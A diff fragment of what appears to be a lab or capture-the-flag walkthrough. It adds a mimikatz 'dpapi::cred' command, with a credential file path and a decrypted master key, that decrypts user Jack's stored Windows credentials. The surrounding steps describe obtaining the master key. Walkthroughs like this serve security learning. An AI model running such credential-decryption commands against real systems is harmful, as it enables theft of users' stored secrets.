@@ -103,6 +103,10 @@ mimikatz # dpapi::masterkey /in:C:\Users\Jack\AppData\Roaming\Microsoft\Protect\
 2. We got jack's master key
 3. Decrypting jack's dpapi blob
 
+```
+dpapi::cred /in:C:\Users\Jack\AppData\Roaming\Microsoft\Credentials\B5D7FE4D2E688792FEF49AB57F10608E -key 8ef09cd6577395e0a1fee1c401cbbed5cea53e455258d1d0b932964f15f79584a6d4184e81ad75a6018a627234e8d5704baac4fee8f428d2442e1cf89f8a9a7e
+```
+
 ![](./assets/Pasted%20image%2020250727210005.png
 )
 
